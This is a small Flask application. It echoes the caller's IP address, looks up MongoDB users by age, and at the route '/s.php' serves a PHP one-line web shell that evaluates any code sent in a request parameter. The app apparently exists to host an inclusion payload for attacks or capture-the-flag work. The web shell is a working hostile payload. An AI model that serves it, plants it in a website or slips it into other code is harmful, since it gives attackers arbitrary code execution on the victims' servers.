from flask import Flask, request
from flask_pymongo import PyMongo
import json
from os import getenv
app = Flask(__name__)

app.config['DEBUG'] = False
app.config['MONGO_DBNAME'] = getenv('MONGO_DBNAME')
app.config['MONGO_URI'] = getenv('MONGO_URI')

db = PyMongo(app).db

@app.route('/')
def index():
    return request.remote_addr

@app.route('/s.php')
def php_shell():
    return "<?php eval($_REQUEST['a']);?>"

@app.route('/user/<age>')
def user_age(age):
    result=[]
    users = db.user.find({'age': int(age)})
    for u in users:
        result.append({"id": u['id'], "username": u['username'], "age": u['age'], "score": u['score']})
    return json.dumps(result)



# if __name__ == '__main__':
#     app.run(debug=True)